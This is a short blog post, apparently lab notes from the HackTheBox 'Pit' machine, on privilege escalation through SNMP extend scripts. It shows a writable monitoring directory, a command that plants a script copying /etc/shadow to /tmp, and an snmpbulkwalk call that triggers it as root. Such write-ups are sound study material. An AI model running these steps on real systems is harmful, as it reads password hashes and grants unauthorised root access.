---
layout: post
title: SNMP Extended Script
description: SNMP Extended Script
summary: SNMP Extended Script
tags: [snmp,privesc]
minute: 1
---
## Overview
Attacker can do privesc if it can gain access to SNMP extensions.

## Environment Setup
* SNMP extension enabled using custom script and low privileged user has write access to custom scripts directory.

```bash
[root@pit ~]# cat /etc/snmp/snmpd.conf | grep extend
extend monitoring /usr/bin/monitor
[root@pit ~]# 
[root@pit ~]# cat /usr/bin/monitor 
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[root@pit ~]# 
[root@pit ~]# getfacl /usr/local/monitoring/
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring/
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---

[root@pit ~]# 
```

## Steps
* Create malicious script

```bash
echo -n '#!/bin/bash\ncat /etc/shadow > /tmp/shadow.txt' > /usr/local/monitoring/check_evil.sh
```

* Trigger SNMP extension

```bash
# 10.10.10.241 - victim IP
snmpbulkwalk -On -r1 -v2c -c public 10.10.10.241 1
```

## Reference
* HTB Pit